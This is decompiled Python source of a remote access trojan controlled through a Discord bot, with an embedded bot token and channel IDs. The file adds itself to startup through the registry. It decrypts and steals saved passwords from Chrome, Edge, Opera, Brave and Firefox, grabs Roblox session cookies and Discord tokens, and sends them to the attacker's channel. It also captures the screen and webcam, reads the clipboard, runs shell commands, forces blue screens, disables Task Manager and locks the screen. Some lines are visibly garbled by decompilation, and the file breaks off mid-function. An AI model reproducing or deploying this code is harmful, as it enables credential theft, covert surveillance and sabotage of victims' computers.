# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: main.py
# Bytecode version: 3.10.0rc2 (3439)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

global mousemess  # inserted
import pyautogui
import sqlite3
import cv2
import time
import threading
import win32api
import discord
import requests
import base64
import os
import json
import psutil
import ctypes
import win32crypt
import rotatescreen as rs
import sys
import winreg
import subprocess
import random
import socket
import pyperclip
import tkinter as tk
import tkinter.messagebox
import browser_cookie3
import inspect
import urllib
import shutil
from discord.ext import commands
from Crypto.Cipher import AES
from datetime import datetime as dt, timedelta
from ctypes import Structure, c_uint
from re import findall
client = commands.Bot(command_prefix='!', intents=discord.Intents.all())
client.remove_command('help')
token = 'MTIzMDg1MjM5OTU3NzU2MzE5OA.GbWGSo.CJssPuhRWV3zwZnJTDimEw1l5iHjb3EQl07M1E'
guild_id = '1230849224388771920'
autostart = True
antivm = False
process_name = 'Rars'
if not process_name.endswith('.exe'):
    process_name = process_name + '.exe'
hide_after_exec = False
backdoor_location = '\\AppData\\Roaming\\'
if backdoor_location == '\\AppData\\Roaming\\':
    backdoor_location = os.environ['appdata'] + '\\' + process_name
else:  # inserted
    backdoor_location = os.environ['appdata'] + '\\Microsoft\\' + process_name
annc_channel_id = '1230849224388771923'
pass_channel_id = annc_channel_id
tokens_channel_id = annc_channel_id
roblosecurity_channel_id = annc_channel_id
clientid = ''
startup_enabled = False
cookies = ''
installationpath = sys._MEIPASS if getattr(sys, 'frozen', False) else os.path.dirname(os.path.abspath(__file__))

def admincheck():
    val = ctypes.windll.shell32.IsUserAnAdmin()
    if val < 1:
        return False
    if val > 0:
        return True
help_menu = f'\nAvailable commands for **{os.getlogin()}** :\n\n**!help** - Shows this message\n**!startup** - Adds the file to startup.\n**!exit** - Stop the RAT from working.\n**!usagelist** - Returns a list of active users.\n**!admin_check** - Checks if you are admin on target computer.\n**!bypass_uac** - Attempts to bypass UAC to get admin privileges.\n**!shell** - Run a shell command\n\n`-----SURVEILLANCE-----`\n\n**!screenshot** - Sends a screenshot of the target machine\n**!idletime** - Displays for how long the user has been AFK\n**!webcam_capture** - Capture a picture of the webcam.\n**!tasklist** - Returns a list of active tasks.\n\n`-----FILE MANAGEMENT-----`\n\n**!chdir** - Changes the current directory. **!chdir <** to go back one directory.\n**!chdisk** - Changes the current disk. (E, C, D, etc.)\n**!ls** - Displays all items in the current directory.\n**!download** - Downloads a file from the specified path.\n**!upload** - Uploads a file to the specified path.\n**!taskkill** - Kills the specified task.\n**!startfile** - Starts a file.\n**!delfile** - Deletes a file.\n**!hidefile** \\ **!unhidefile** - Hides/unhides a file.\n\n`-----INFORMATION GATHERING-----`\n\n**!whois** - Prints the user\"s name\n**!getip** - Gets the current user\'s IP address\n**!clipboard** - Returns a string of the user\'s clipboard.\n**!grabpasswords** - Steal all the passwords from the device.\n**!grabroblox** - Grabs the user\'s Roblox account cookie.\n**!hardware_list** - Lists the user\'s hardware on newlines.\n'
help_menu2 = '\n**!grabdiscord** - Fetches the user\'s Discord account token.\n\n`-----SANCTIONING-----`\n\n**!bsod** - Blue screens the computer.\n**!disabletaskmgr** \\ **!enabletaskmanager** - Disable/enable task manager.\n**!logoff** - Logs the user off.\n**!shutdown** - Shuts the user\'s PC off.\n**!restart** - Restarts the user\'s PC.\n**!blockscreen** - Blocks the user\'s screen. (IRREVERSIBLE UNTIL USER RESTARTS)\n**!critproc** - Makes the RAT a critical process, meaning if it\'s task killed the user will get a BSOD.\n**!screenflip** - Rotates the user\'s screen 90 degrees.\n\n`-----FUN-----`\n\n**!write** - Writes a sentence then presses enter.\n**!setclipboard** - Sets the clipboard to the specified string of text.\n**!forcedesktop** - Sends the user on desktop automatically.\n**!messmouse** - Shakes the user\'s cursor when they try to move the mouse, run this command again to stop.\n**!opensite** - Opens a site on the user\'s browser.\n**!key_press** - Press a key.\n**!showtaskbar** \\ **!hidetaskbar**\n\n`-----COMMUNICATION-----`\n\n**!questionmsg** - Sends the user a question message.\n**!warningmsg** - Sends the user a warning message.\n**!errormsg** - Sends the user an error message.\n**!infomsg** - Sends the user an informative message.\n\n```* You need to specify the usage ID after every command. Arguments come after.\n\nExample : !write (usage-id) (sentence) => !write 123456 Test sentence\n          !questionmsg (usage-id) (message) => !questionmsg 123456 Test Message\n```\n'
idedd = ''
chars = '1234567890'
clientid = ''.join(random.sample(chars, 6))

class LASTINPUTINFO(Structure):
    _fields_ = [('cbSize', c_uint), ('dwTime', c_uint)]

def get_idle_duration():
    idle_time = win32api.GetTickCount() - win32api.GetLastInputInfo()
    idle_time /= 1000
    return idle_time

def takeScreenshot():
    temp = os.getenv('temp')
    sc = pyautogui.screenshot()
    sc.save(temp + '\\screenshot.png')

def disable_task_manager():
    registry_path = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System'
    registry_name = 'DisableTaskMgr'
    value = 1
    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, registry_name, 0, winreg.REG_SZ, value)
        winreg.CloseKey(reg_key)
        return True
    except WindowsError as e:
        return e

def enable_task_manager():
    registry_path = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System'
    registry_name = 'DisableTaskMgr'
    value = 0
    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, registry_name, 0, winreg.REG_SZ, value)
        winreg.CloseKey(reg_key)
        return True
    except WindowsError as e:
        return e

@client.event
async def on_ready():
    with urllib.request.urlopen('https://geolocation-db.com/json') as url:
        ldata = json.loads(url.read().decode())
        cflag = ldata['country_code']
        ipaddress = ldata['IPv4']
    output = os.popen('wmic os get name').read()
    if 'Windows 10' in output:
        platform = 'Windows 10'
    else:  # inserted
        if 'Windows 11' in output:
            platform = 'Windows 11'
        else:  # inserted
            if 'Windows 8' in output:
                platform = 'Windows 8'
            else:  # inserted
                if 'Windows 7' in output:
                    platform = 'Windows 7'
                else:  # inserted
                    platform = 'Unbound'
    user = os.getlogin()
    host_id = socket.gethostname()
    channel = client.get_channel(int(annc_channel_id))
    takeScreenshot()
    path = f"{os.getenv('temp')}\\screenshot.png"
    await channel.send(f'\n||@everyone|| The RAT has sniped :flag_{cflag.lower()}: **{user}** :flag_{cflag.lower()}: with desktop ID **{host_id}**.\n\n``` APHROBYTE RAT v1.9.2 | {client.user.name} | RIOT ADMINISTRATION ```\n\n:skull_crossbones: `->` IP Address : ||{ipaddress}|| <- :flag_{cflag.lower()}:\n:skull_crossbones: `->` Admin privileges : **{admincheck()}**\n:skull_crossbones: `->` Auto startup : **{autostart}**\n:skull_crossbones: `->` OS : **{platform}**\n:skull_crossbones: `->` Usage ID : ||{clientid}||\n\n``` APHROBYTE RAT v1.9.2 | {client.user.name} | RIOT ADMINISTRATION ```\n\nHelp menu : **!help ||{clientid}||**\nGet list of active users : **!usagelist**\n\nRAT installed in : `{installationpath}`\n\n:point_down: **__USER SCREEN__** :point_down:\n', file=discord.File(path))
    os.remove(path)
    print(f'{client.user} is now online! Clientid {clientid}')

@client.command()
async def help(ctx, *, usid):
    if usid == clientid:
        await ctx.send(help_menu)
        await ctx.send(help_menu2)

@client.command()
async def screenshot(ctx, *, usid):
    if usid == clientid:
        takeScreenshot()
        path = f"{os.getenv('temp')}\\screenshot.png"
        await ctx.send(f'Surveillance SS -> **{os.getlogin()}**:', file=discord.File(path))
        os.remove(path)

@client.command()
async def write(ctx, usid, *, sentence):
    if usid == clientid:
        pyautogui.write(sentence)
        pyautogui.press('enter')
        await ctx.send(f'The user has now written **{sentence}** on their computer.')

@client.command()
async def whois(ctx, *, usid):
    if usid == clientid:
        user = os.getlogin()
        await ctx.send(f'You are on **{user}**\'s computer')

@client.command()
async def getip(ctx, *, usid):
    if usid == clientid:
        with urllib.request.urlopen('https://geolocation-db.com/json') as url:
            ldata = json.loads(url.read().decode())
            cflag = ldata['country_code']
            ipaddress = ldata['IPv4']
        await ctx.send(f'**{os.getlogin()}**\'s IP is :flag_{cflag.lower()}: **{ipaddress}** :flag_{cflag.lower()}:')

@client.command()
async def exit(ctx, *, usid):
    if usid == clientid:
        await ctx.send(f'The RAT process has been killed on **{os.getlogin()}**\'s machine.')
        sys.exit()

@client.command()
async def bsod(ctx, *, usid):
    if usid == clientid:
        ntdll = ctypes.windll.ntdll
        prev_value = ctypes.c_bool()
        res = ctypes.c_ulong()
        ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
        if not ntdll.NtRaiseHardError(3735936685, 0, 0, 0, 6, ctypes.byref(res)):
            await ctx.send('BSOD failed with unexpected error.')
        else:  # inserted
            await ctx.send(f'{os.getlogin()} has been blue screened.')

@client.command()
async def startup(ctx, *, usid):
    if usid == clientid:
        if startup_enabled!= True:
            path = sys.argv[0]
            isexe = False
            if sys.argv[0].endswith('exe'):
                isexe = True
            if isexe:
                if sys.argv[0].endswith('exe') and (not os.path.exists(backdoor_location)):
                    shutil.copyfile(sys.executable, backdoor_location)
                    subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v update /t REG_SZ /d \"' + backdoor_location + '\" /f', shell=True)
                await ctx.send(f'Added file to startup for **{os.getlogin()}**')
        else:  # inserted
            if startup_enabled == True:
                await ctx.send(f'Startup already enabled for **{os.getlogin()}**')

@client.command()
async def disabletaskmgr(ctx, *, usid):
    if usid == clientid:
        value = disable_task_manager()
        if value == True:
            await ctx.send(f'Task manager has been disabled for **{os.getlogin()}**')
        else:  # inserted
            await ctx.send('Insufficient permissions.')

@client.command()
async def enabletaskmgr(ctx, *, usid):
    if usid == clientid:
        value = enable_task_manager()
        if value == True:
            await ctx.send(f'Task manager has been enabled for **{os.getlogin()}**')
        else:  # inserted
            await ctx.send('Insufficient permissions.')

@client.command()
async def idletime(ctx, *, usid):
    if usid == clientid:
        idletime = get_idle_duration()
        if idletime < 1:
            await ctx.send(f'**{os.getlogin()}** isn\'t idle.')
        else:  # inserted
            if idletime >= 1:
                await ctx.send(f'Idletime for **{os.getlogin()}**: {str(idletime)}')

@client.command()
async def clipboard(ctx, *, usid):
    if usid == clientid:
        current_clipboard = str(pyperclip.paste())
        await ctx.send(f'Clipboard content for **{os.getlogin()}** is : \n\n{current_clipboard}')

def my_chrome_datetime(time_in_mseconds):
    return dt(1601, 1, 1) + timedelta(microseconds=int(time_in_mseconds))

def encryption_key(browser):
    localState_path = None
    if browser == 'Chrome':
        localState_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State')
    else:  # inserted
        if browser == 'Edge':
            localState_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Local State')
        else:  # inserted
            if browser == 'Opera GX':
                localState_path = os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera GX Stable', 'Local State')
            else:  # inserted
                if browser == 'Opera':
                    localState_path = os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable', 'Local State')
                else:  # inserted
                    if browser == 'Brave':
                        localState_path = os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware', 'Brave-Browser', 'User Data', 'Local State')
    with open(localState_path, 'r', encoding='utf-8') as file:
        local_state_file = file.read()
        local_state_file = json.loads(local_state_file)
    ASE_key = base64.b64decode(local_state_file['os_crypt']['encrypted_key'])[5:]
    return win32crypt.CryptUnprotectData(ASE_key, None, None, None, 0)[1]

def decrypt_password(enc_password, key, browser):
    try:
        init_vector = enc_password[3:15]
        enc_password = enc_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, init_vector)
        return cipher.decrypt(enc_password)[:(-16)].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(enc_password, None, None, None, 0)[1])
        except:
            return 'No passwords available (logged in with social account)'

def steal_chrome_passwords():
    password_db_path = []
    if os.path.exists(f"{os.getenv('userprofile')}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"):
        password_db_path.append(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'))
    else:  # inserted
        return {}
    for file in os.listdir(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data')):
        if file.startswith('Profile'):
            profile_number = file
            password_db_path.append(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', profile_number, 'Login Data'))
    all_data = {}
    for password_path in password_db_path:
        shutil.copyfile(password_path, 'my_chrome_data.db')
        db = sqlite3.connect('my_chrome_data.db')
        cursor = db.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value, date_created FROM logins')
        encp_key = encryption_key('Chrome')
        data = {}
        for row in cursor.fetchall():
            try:
                site_url = row[0]
                username = row[1]
                password = decrypt_password(row[2], encp_key, 'Chrome')
                date_created = row[3]
                if username or password:
                    if site_url not in data:
                        data[site_url] = []
                    data[site_url].append({'username': username, 'password': password, 'date_created': str(my_chrome_datetime(date_created))})
            except:
                continue
        cursor.close()
        db.close()
        os.remove('my_chrome_data.db')
        all_data.update(data)
    return all_data

def steal_firefox_passwords():
    if not os.path.exists(os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')):
        return {}
    profiles = os.listdir(os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles'))
    stolen_data = {}
    for profile in profiles:
        if profile.endswith('.default'):
            logins_path = os.path.join(os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles'), profile, 'logins.json')
            if os.path.isfile(logins_path):
                try:
                    with open(logins_path, 'r', encoding='utf-8') as file:
                        logins_data = json.load(file)
                        for login in logins_data['logins']:
                            site_url = login['hostname']
                            username = login['username']
                            password = login['password']
                            date_created = login['timeCreated']
                            if username or password:
                                if site_url not in stolen_data:
                                    stolen_data[site_url] = []
                                stolen_data[site_url].append({'username': username, 'password': password, 'date_created': str(my_chrome_datetime(date_created))})
                except:
                    continue
    return stolen_data

def steal_edge_passwords():
    if not os.path.exists(os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')):
        return {}
    encp_key = encryption_key('Edge')
    shutil.copyfile(os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'), 'my_edge_data.db')
    db = sqlite3.connect('my_edge_data.db')
    cursor = db.cursor()
    cursor.execute('SELECT origin_url, username_value, password_value, date_created FROM logins')
    data = {}
    for row in cursor.fetchall():
        try:
            site_url = row[0]
            username = row[1]
            password = decrypt_password(row[2], encp_key, 'Edge')
            date_created = row[3]
            if username or password:
                if site_url not in data:
                    data[site_url] = []
                data[site_url].append({'username': username, 'password': password, 'date_created': str(my_chrome_datetime(date_created))})
        except:
            continue
    cursor.close()
    db.close()
    os.remove('my_edge_data.db')
    return data

def steal_opera_gx_passwords():
    if not os.path.exists(f"{os.getenv('APPDATA')}\\Opera Software\\Opera GX Stable\\Login Data"):
        return {}
    encp_key = encryption_key('Opera GX')
    shutil.copyfile(os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera GX Stable', 'Login Data'), 'my_opera_data.db')
    db = sqlite3.connect('my_opera_data.db')
    cursor = db.cursor()
    cursor.execute('SELECT origin_url, username_value, password_value, date_created FROM logins')
    data = {}
    for row in cursor.fetchall():
        try:
            site_url = row[0]
            username = row[1]
            password = decrypt_password(row[2], encp_key, 'Opera')
            date_created = row[3]
            if username or password:
                if site_url not in data:
                    data[site_url] = []
                data[site_url].append({'username': username, 'password': password, 'date_created': str(my_chrome_datetime(date_created))})
        except:
            continue
    cursor.close()
    db.close()
    os.remove('my_opera_data.db')
    return data

def steal_brave_passwords():
    if not os.path.exists(os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Login Data')):
        return {}
    encp_key = encryption_key('Brave')
    shutil.copyfile(os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Login Data'), 'my_brave_data.db')
    db = sqlite3.connect('my_brave_data.db')
    cursor = db.cursor()
    cursor.execute('SELECT origin_url, username_value, password_value, date_created FROM logins')
    data = {}
    for row in cursor.fetchall():
        try:
            site_url = row[0]
            username = row[1]
            password = decrypt_password(row[2], encp_key, 'Brave')
            date_created = row[3]
            if username or password:
                if site_url not in data:
                    data[site_url] = []
                data[site_url].append({'username': username, 'password': password, 'date_created': str(my_chrome_datetime(date_created))})
        except:
            continue
    cursor.close()
    db.close()
    os.remove('my_brave_data.db')
    return data

def steal_opera_passwords():
    if not os.path.exists(f"{os.getenv('APPDATA')}\\Opera Software\\Opera Stable\\Login Data"):
        return {}
    encp_key = encryption_key('Opera')

    @shutil.copyfile
    os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable', 'Login Data'), 'my_opera_data.db')
    db = sqlite3.connect('my_opera_data.db')
    cursor = db.cursor()
    cursor.execute('SELECT origin_url, username_value, password_value, date_created FROM logins')
    data = {}
    for row in cursor.fetchall():
        try:
            site_url = row[0]
            username = row[1]
            password = decrypt_password(row[2], encp_key, 'Opera')
            date_created = row[3]
            if username or password:
                if site_url not in data:
                    data[site_url] = []
                data[site_url].append({'username': username, 'password': password, 'date_created': str(my_chrome_datetime(date_created))})
        except:
            continue
    cursor.close()
    db.close()
    os.remove('my_opera_data.db')
    return data

def steal_passwords():
    chrome_data = steal_chrome_passwords()
    firefox_data = steal_firefox_passwords()
    edge_data = steal_edge_passwords()
    operagx_data = steal_opera_gx_passwords()
    opera_data = steal_opera_passwords()
    brave_data = steal_brave_passwords()
    combined_data = {**chrome_data, **firefox_data, **edge_data, **operagx_data, **opera_data, **brave_data}
    if len(combined_data) > 0:
        return combined_data

def save_credentials_as_file(credentials_data):
    filename = f'{os.getlogin()}-passwords.txt'
    with open(filename, 'w', encoding='utf8') as file:
        for site_url, credentials_list in credentials_data.items():
            file.write(f'Site URL: {site_url}\n')
            for credentials in credentials_list:
                file.write(f"Username: {credentials['username']}\n")
                file.write(f"Password: {credentials['password']}\n")
                file.write(f"Date Created: {credentials['date_created']}\n")
            file.write('\n')
        return filename
        return filename

@client.command()
async def grabpasswords(ctx, usid):
    if usid == clientid:
        await ctx.send(f':hourglass: Started grabbing **{os.getlogin()}**\'s passwords')
        file_path = save_credentials_as_file(steal_passwords())
        try:
            with open(file_path, 'r', encoding='utf8') as file:
                file_data = discord.File(file, filename='stolen_credentials.txt')
        except Exception as e:
            await ctx.send(f'Couldn\'t grab passwords for **{os.getlogin()}**: `{e}`')
        await ctx.send(f':white_check_mark: Grabbed **{os.getlogin()}**\'s passwords', file=file_data)

@client.command()
async def logoff(ctx, *, usid):
    if usid == clientid:
        os.system('shutdown /l /f')
        await ctx.send(f'**{os.getlogin()}** logged off.')

@client.command()
async def shutdown(ctx, *, usid):
    if usid == clientid:
        await ctx.send(f'**{os.getlogin()}**\'s PC has been shut down.')
        os.system('shutdown /p')

@client.command()
async def setclipboard(ctx, usid, *, clipboard):
    if usid == clientid:
        try:
            pyperclip.copy(clipboard)
        except Exception as e:
            await ctx.send(f'Error trying to set clipboard for **{os.getlogin()}**: `{e}`')
        current_clipboard = str(pyperclip.paste())
        await ctx.send(f'Successfully set the clipboard to **{current_clipboard}** for **{os.getlogin()}**')

@client.command()
async def forcedesktop(ctx, *, usid):
    if usid == clientid:
        pyautogui.keyDown('winleft')
        pyautogui.press('d')
        pyautogui.keyUp('winleft')
        await ctx.send(f'Sent **{os.getlogin()}** to the desktop.')

@client.command()
async def webcam_capture(ctx, *, usid):
    if usid == clientid:
        camera_count = cv2.getBuildInformation().count('Video I/O')
        if camera_count == 0:
            await ctx.send(f'No cameras found for **{os.getlogin()}**.')
            return
        cam_number = 0
        for camera_index in range(camera_count):
            camera = cv2.VideoCapture(camera_index)
            success, frame = camera.read()
            if success:
                cam_number = cam_number + 1
                image_path = f'camera_{camera_index}.jpg'
                cv2.imwrite(image_path, frame)
                with open(image_path, 'rb') as file:
                    picture = discord.File(file, filename=image_path)
                    embed = discord.Embed(color=discord.Color.green())
                    embed.set_image(url=f'attachment://{image_path}')
                    await ctx.send(content=f'**{os.getlogin()}**\'s webcam - **Camera {str(cam_number)}**', embed=embed, file=picture)
                os.remove(image_path)
            camera.release()
        if cam_number == 0:
            await ctx.send(f'**{os.getlogin()}** has no webcam available.')

def on_closing():
    return

def screenblock():
    box = tk.Tk()
    box.attributes('-fullscreen', True)
    box.attributes('-topmost', True)
    box.configure(background='black')
    box.protocol('WM_DELETE_WINDOW', on_closing)
    box.mainloop()

@client.command()
async def blockscreen(ctx, *, usid):
    if usid == clientid:
        threading.Thread(target=screenblock, daemon=True).start()
        await ctx.send(f'**{os.getlogin()}**\'s screen has been blocked.')
mousemess = False

def StartMouseMess():
    while mousemess:
        x = random.randint(600, 700)
        y = random.randint(600, 700)
        pyautogui.moveTo(x, y, 3)
        time.sleep(1)

@client.command()
async def messmouse(ctx, *, usid):
    global mousemess  # inserted
    if usid == clientid:
        if mousemess == False:
            mousemess = True
            threading.Thread(target=StartMouseMess, daemon=True).start()
            await ctx.send(f'Started messing **{os.getlogin()}**\'s mouse.')
        else:  # inserted
            if mousemess == True:
                mousemess = False
                await ctx.send(f'Stopped messing **{os.getlogin()}**\'s mouse.')

@client.command()
async def usagelist(ctx):
    list_usage = f'Active : **{os.getlogin()}** with desktop ID **{socket.gethostname()}** and usage ID **{clientid}**. Admin privileges : **{admincheck()}** `v1.9.2`'
    await ctx.send(list_usage)

@client.command()
async def questionmsg(ctx, usid, *, message):
    if usid == clientid:
        await ctx.send(f'Sent **{os.getlogin()}** a question message.')
        root = tkinter.Tk()
        root.wm_attributes('-topmost', 1)
        root.withdraw()
        response = tkinter.messagebox.askyesno('Question', message, parent=root)
        if response:
            await ctx.send(f'**{os.getlogin()}** has replied with **Yes** to your question which was `{message}`')
            root.destroy()
        else:  # inserted
            await ctx.send(f'**{os.getlogin()}** has replied with **No** to your question which was `{message}`')
            root.destroy()

@client.command()
async def warningmsg(ctx, usid, *, message):
    if usid == clientid:
        await ctx.send(f'Sent **{os.getlogin()}** a warning message.')
        root = tkinter.Tk()
        root.wm_attributes('-topmost', 1)
        root.withdraw()
        tk.messagebox.showwarning(title='Warning', message=message, parent=root)
        await ctx.send(f'**{os.getlogin()}** saw the warning sent which was `{message}`')
        root.destroy()

@client.command()
async def errormsg(ctx, usid, *, message):
    if usid == clientid:
        await ctx.send(f'Sent **{os.getlogin()}** an error message.')
        root = tkinter.Tk()
        root.wm_attributes('-topmost', 1)
        root.withdraw()
        tk.messagebox.showerror(title='Error', message=message, parent=root)
        root.destroy()

@client.command()
async def infomsg(ctx, usid, *, message):
    if usid == clientid:
        await ctx.send(f'Sent **{os.getlogin()}** an informative message.')
        root = tkinter.Tk()
        root.wm_attributes('-topmost', 1)
        root.withdraw()
        tk.messagebox.showinfo(title='Information', message=message, parent=root)
        await ctx.send(f'**{os.getlogin()}** acknowledged the informative message sent which was `{message}`')
        root.destroy()

@client.command()
async def opensite(ctx, usid, *, website):
    if usid == clientid:
        os.system(f'start {website}')
        await ctx.send(f'Opened **{website}** for **{os.getlogin()}**')

@client.command()
async def admin_check(ctx, usid):
    value = admincheck()
    if usid == clientid:
        if value:
            await ctx.send(f'You have admin privileges against **{os.getlogin()}**')
        else:  # inserted
            if not value:
                await ctx.send(f'You do not have admin privileges against **{os.getlogin()}**')

def cookieLogger():
    data = []
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        return None

@client.command()
async def grabroblox(ctx, *, usid):
    cookies = cookieLogger()
    roblox_cookie = cookies[1]
    if usid == clientid:
        postchannel = client.get_channel(int(roblosecurity_channel_id))
        await ctx.send(f':skull_crossbones: Started searching for **{os.getlogin()}**\'s ROBLOSECURITY')
        await postchannel.send(f'\n{ctx.author.mention} .ROBLOSECURITY for **{os.getlogin()}** : \n```\n{roblox_cookie}\n```\n\nBypass IP lock with https://rbxfresh.com/\n')
        await ctx.send(f':white_check_mark: **{os.getlogin()}**\'s cookies have been sent in <#{roblosecurity_channel_id}>')

def token_grab():
    LOCAL = os.getenv('LOCALAPPDATA')
    ROAMING = os.getenv('APPDATA')
    PATHS = [ROAMING + '\\Discord', ROAMING + '\\discordcanary', ROAMING + '\\discordptb', LOCAL + '\\Google\\Chrome\\User Data\\Default', LOCAL + '\\Google\\Chrome\\User Data\\Profile 1', LOCAL + '\\Google\\Chrome\\User Data\\Profile 2', LOCAL + '\\Google\\Chrome\\User Data\\Profile 3', LOCAL + '\\Google\\Chrome\\User Data\\Profile 4', LOCAL + '\\Google\\Chrome\\User Data\\Profile 5', ROAMING + '\\Opera Software\\Opera Stable', LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default', LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default', ROAMING + '\\Opera Software\\Opera GX Stable\\']
    for path in reversed(PATHS):
        if not os.path.exists(path):
            PATHS.remove(path)
    regex1 = '[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}'
    regex2 = 'mfa\\\\.[\\\\w-]{84}'
    encrypted_regex = 'dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$]{120}'

    def getheaders(token=None, content_type='application/json'):
        headers = {'Content-Type': content_type, 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
        if token:
            headers.update({'Authorization': token})
        return headers

    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_token(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = generate_cipher(master_key, iv)
            decrypted_pass = decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:(-16)].decode()
            return decrypted_pass
        except Exception:
            return 'Couldn\'t decrypt token'

    def get_master_key(path):
        with open(path, 'r', encoding='utf-8') as f:
            local_state = f.read()
        local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def gettokens(path):
        path1 = path
        path += '\\Local Storage\\leveldb'
        tokens = []
        try:
            if 'discord' not in path.lower():
                for file_name in os.listdir(path):
                    if not file_name.endswith('.log') and (not file_name.endswith('.ldb')):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in findall(regex1, line):
                            try:
                                r = requests.get('https://discord.com/api/v9/users/@me', headers=getheaders(token))
                                if r.status_code == 200 and token in tokens:
                                    continue
                            except Exception:
                                continue
                            tokens.append(token)
                        for token in findall(regex2, line):
                            print(token)
                            try:
                                r = requests.get('https://discord.com/api/v9/users/@me', headers=getheaders(token))
                                if r.status_code == 200 and token in tokens:
                                    continue
                            except Exception:
                                continue
                            tokens.append(token)
                return tokens
            else:  # inserted
                for file_name in os.listdir(path):
                    if not file_name.endswith('.log') and (not file_name.endswith('.ldb')):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for y in findall(encrypted_regex, line):
                            token = decrypt_token(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_master_key(path1 + '\\Local State'))
                            try:
                                r = requests.get('https://discord.com/api/v9/users/@me', headers=getheaders(token))
                                if r.status_code == 200:
                                    if token in tokens:
                                        continue
                                    tokens.append(token)
                            except:
                                pass
                return tokens
        except Exception as e:
            return []
    all_tokens = []
    for path_grab in PATHS:
        if os.path.exists(path_grab):
            for token in gettokens(path_grab):
                all_tokens.append(f'`{path_grab}` - **MTIzMDg1MjM5OTU3NzU2MzE5OA.GbWGSo.CJssPuhRWV3zwZnJTDimEw1l5iHjb3EQl07M1E**')
    return str(all_tokens).replace('[', '').replace(']', '').replace('\'', '').replace(',', '')

@client.command()
async def grabdiscord(ctx, *, usid):
    if usid == clientid:
        postchannel = client.get_channel(int(tokens_channel_id))
        await ctx.send(f':skull_crossbones: Searching for **{os.getlogin()}**\'s account tokens...')
        await postchannel.send(f'{ctx.author.mention} Account tokens for **{os.getlogin()}** : \n\n{token_grab()}')
        await ctx.send(f':white_check_mark: **{os.getlogin()}**\'s account tokens have been sent in <#{tokens_channel_id}>')

@client.command()
async def chdir(ctx, usid, *, directory):
    if usid == clientid:
        if directory!= '<':
            try:
                os.chdir(f'{os.getcwd()}\\{directory}')
                await ctx.send(f'Directory changed to **{directory}** for **{os.getlogin()}**')
            except:
